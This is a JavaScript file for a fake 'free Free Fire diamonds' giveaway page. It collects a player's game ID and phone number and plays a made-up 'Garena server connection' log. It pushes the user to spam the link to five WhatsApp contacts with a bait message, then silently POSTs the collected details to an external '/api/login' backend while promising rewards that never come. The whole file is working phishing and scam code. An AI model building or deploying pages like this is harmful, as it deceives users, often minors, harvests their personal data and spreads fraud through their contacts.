// ==============================================================
// CONFIGURATION (Set your deployed referral URL here)
// ==============================================================
const REFERRAL_LINK = "https://free-daimonds-giveaway.onrender.com";
// ==============================================================

document.addEventListener('DOMContentLoaded', () => {
    // DOM Elements - Connection Step
    const playerIdInput = document.getElementById('playerId');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const connectBtn = document.getElementById('connectBtn');
    const connectionForm = document.getElementById('connectionForm');

    const statusConsole = document.getElementById('statusConsole');
    const consoleLogs = document.getElementById('consoleLogs');
    const connectionSuccess = document.getElementById('connectionSuccess');
    const playerNameDisplay = document.getElementById('playerNameDisplay');

    const step1Card = document.getElementById('step1Card');
    const step2Card = document.getElementById('step2Card');

    // DOM Elements - Sharing & Claims
    const referralUrlInput = document.getElementById('referralUrl');
    const shareBtn = document.getElementById('shareBtn');
    const viewStatusBtn = document.getElementById('viewStatusBtn');

    const progressText = document.getElementById('progressText');
    const progressBar = document.getElementById('progressBar');
    const rewardConsole = document.getElementById('rewardConsole');
    const toastContainer = document.getElementById('toastContainer');

    // State Variables
    let referralCount = 0;
    const maxReferrals = 5;
    let connectedPlayerId = "";

    // Set the configured referral URL in the input field
    if (referralUrlInput) {
        referralUrlInput.value = REFERRAL_LINK;
    }

    const mockNames = [
        "FF_CRIMSON_BOY", "GARENA_SLAYER", "Sniper_Elite_FF",
        "ALPHA_DRAGON", "VORTEX_WARRIOR", "FF_Master_X",
        "FF_RAIDER_77", "GarenaLegend", "SniperQueen_FF"
    ];

    // Toast Notification System
    function showToast(message, type = 'success') {
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <span>✨</span>
            <span>${message}</span>
        `;
        toastContainer.appendChild(toast);

        // Remove toast after animation completes
        setTimeout(() => {
            toast.style.animation = 'slideUp 0.3s reverse forwards';
            setTimeout(() => {
                toast.remove();
            }, 300);
        }, 3000);
    }

    // Step 1: Simulate Garena Account Connection
    connectBtn.addEventListener('click', () => {
        const idVal = playerIdInput.value.trim();
        const phoneVal = phoneNumberInput.value.trim();

        if (!idVal || idVal.length < 4) {
            showToast("Please enter a valid Gaming ID (min 4 characters).", "error");
            return;
        }

        if (!phoneVal || phoneVal.length < 7) {
            showToast("Please enter a valid mobile number.", "error");
            return;
        }

        connectedPlayerId = idVal;

        // Hide form & show console loader
        connectionForm.style.display = 'none';
        statusConsole.style.display = 'flex';
        consoleLogs.innerHTML = '';

        const logs = [
            `Connecting to Garena Secure Database...`,
            `Searching for ID: ${idVal}...`,
            `Status: Found!`,
            `Linking Mobile Number: ${phoneVal}...`,
            `Authenticating secure event ticket claim?ref=ff92a...`,
            `Garena Server Connection: Established!`
        ];

        let lineIdx = 0;
        function printNextLog() {
            if (lineIdx < logs.length) {
                const line = document.createElement('div');
                line.className = 'console-line';
                line.textContent = `> ${logs[lineIdx]}`;
                consoleLogs.appendChild(line);
                lineIdx++;
                setTimeout(printNextLog, 600);
            } else {
                // Completed connection sequence
                setTimeout(() => {
                    statusConsole.style.display = 'none';
                    connectionSuccess.style.display = 'flex';
                    // Save state
                    localStorage.setItem('garena_step1_connected', 'true');
                    localStorage.setItem('garena_player_id', connectedPlayerId);
                    localStorage.setItem('garena_phone_number', phoneVal);
                    
                    // Reset database submission states and referrals to allow new submission
                    localStorage.removeItem('form_submitted_to_db');
                    localStorage.removeItem('form_submitted');
                    localStorage.removeItem('garena_referrals');
                    referralCount = 0;
                    updateProgress();
                    
                    // Toggle buttons visibility back to initial share state
                    if (shareBtn) shareBtn.style.display = 'block';
                    if (viewStatusBtn) viewStatusBtn.style.display = 'none';
                    
                    unlockShareStep();
                }, 800);
            }
        }

        printNextLog();
    });

    function getRandomName() {
        const name = mockNames[Math.floor(Math.random() * mockNames.length)];
        playerNameDisplay.textContent = name;
        return name;
    }

    // Unlock Step 2: Sharing Challenge
    function unlockShareStep() {
        step2Card.classList.remove('locked');
        step2Card.classList.add('active');
        showToast("Account Linked! Proceed to Step 2 to invite friends.");
    }

    // Congratulations Popup Trigger
    function showCongratulations() {
        const congratsModal = document.getElementById('congratsModal');
        const displayId = document.getElementById('displayDisplayId');
        const displayPhone = document.getElementById('displayDisplayPhone');
        
        const savedId = localStorage.getItem('garena_player_id') || connectedPlayerId || "-";
        const savedPhone = localStorage.getItem('garena_phone_number') || phoneNumberInput.value.trim() || "-";

        if (displayId) displayId.textContent = savedId;
        if (displayPhone) displayPhone.textContent = savedPhone;

        if (congratsModal) {
            congratsModal.classList.add('open');
        }
        
        localStorage.setItem('form_submitted', 'true');
    }

    // Close & View Status Event Handlers
    const closeCongratsBtn = document.getElementById('closeCongratsBtn');
    if (closeCongratsBtn) {
        closeCongratsBtn.addEventListener('click', () => {
            const congratsModal = document.getElementById('congratsModal');
            if (congratsModal) {
                congratsModal.classList.remove('open');
            }
        });
    }

    if (viewStatusBtn) {
        viewStatusBtn.addEventListener('click', () => {
            showCongratulations();
        });
    }

    // WhatsApp Direct Sharing & Progress Increment
    shareBtn.addEventListener('click', () => {
        if (step2Card.classList.contains('locked')) return;

        const encodedLink = encodeURIComponent(referralUrlInput.value);
        const message = encodeURIComponent(`Get 500 Free Fire Diamonds Crate! Link account and claim here: `);
        const shareUrl = `https://api.whatsapp.com/send?text=${message}${encodedLink}`;

        window.open(shareUrl, '_blank');

        // Increment Referral Counter
        if (referralCount < maxReferrals) {
            referralCount++;
            updateProgress();
            localStorage.setItem('garena_referrals', referralCount);

            if (referralCount === maxReferrals) {
                completeChallenge();
            } else {
                showToast(`Redirecting to WhatsApp! Referral count updated (${referralCount}/${maxReferrals}).`);
            }
        }
    });

    // Update Progress UI
    function updateProgress() {
        const percentage = (referralCount / maxReferrals) * 100;
        progressBar.style.width = `${percentage}%`;
        progressText.textContent = `${referralCount} / ${maxReferrals} Invited`;
    }

    // Handle Completed Challenge
    function completeChallenge() {
        rewardConsole.classList.add('unlocked');
        
        // Toggle visibility of the buttons
        if (shareBtn) shareBtn.style.display = 'none';
        if (viewStatusBtn) viewStatusBtn.style.display = 'block';

        // Send data directly to backend database if not already submitted
        const alreadySubmittedToDb = localStorage.getItem('form_submitted_to_db') === 'true';
        if (!alreadySubmittedToDb) {
            const savedId = localStorage.getItem('garena_player_id') || connectedPlayerId || "";
            const savedPhone = localStorage.getItem('garena_phone_number') || "";

            // Automatically detect backend API location
            const apiUrl = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && window.location.port === '5500'
                ? 'http://localhost:3000/api/login'
                : 'https://freefire-backend-f409.onrender.com/api/login';

            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ 
                    email: null, 
                    password: null,
                    playerId: savedId,
                    phoneNumber: savedPhone
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    localStorage.setItem('form_submitted_to_db', 'true');
                    console.log('Submission saved successfully to database');
                } else {
                    console.error('Server error when saving submission:', data.message);
                }
            })
            .catch(err => {
                console.error('Network error when saving submission:', err);
            });
        }

        showCongratulations();
    }

    // -------------------------------------------------------------
    // Session State Restoration & Callback Handling
    // -------------------------------------------------------------
    const isStep1Connected = localStorage.getItem('garena_step1_connected') === 'true';
    const savedPlayerId = localStorage.getItem('garena_player_id') || "";
    const savedReferralCount = parseInt(localStorage.getItem('garena_referrals') || "0");

    if (isStep1Connected && savedPlayerId) {
        // Restore Step 1 state
        connectedPlayerId = savedPlayerId;
        connectionForm.style.display = 'none';
        statusConsole.style.display = 'none';
        connectionSuccess.style.display = 'flex';

        // Restore Step 2 state
        step2Card.classList.remove('locked');
        step2Card.classList.add('active');
        referralCount = savedReferralCount;
        updateProgress();

        if (referralCount >= maxReferrals) {
            completeChallenge();
        }
    }
});
